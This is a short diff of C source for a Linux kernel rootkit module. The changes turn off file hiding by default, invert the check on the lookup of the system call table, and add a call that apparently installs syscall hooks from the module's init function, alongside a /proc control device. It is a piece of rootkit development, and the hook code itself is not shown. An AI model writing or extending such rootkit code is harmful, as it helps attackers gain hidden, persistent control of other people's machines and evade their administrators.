@@ -40,7 +40,7 @@ static struct file_operations g7_fops =
 
 
 rootkit_t rootkit = {
-    .hiding_files = true,
+    .hiding_files = false,
 };
 
 
@@ -93,8 +93,10 @@ g7_init(void)
     mutex_init(&lock);
     proc_create_data(G7_DEVICE, S_IRUSR | S_IWUSR, 0, &g7_fops, buf);
 
-    if (!retrieve_sys_call_table())
+    if (retrieve_sys_call_table())
         return -1;
+
+    init_hooks();
 
     DEBUG_INFO("[g7_init] at /proc/%s\n", G7_DEVICE);
     report_channels();
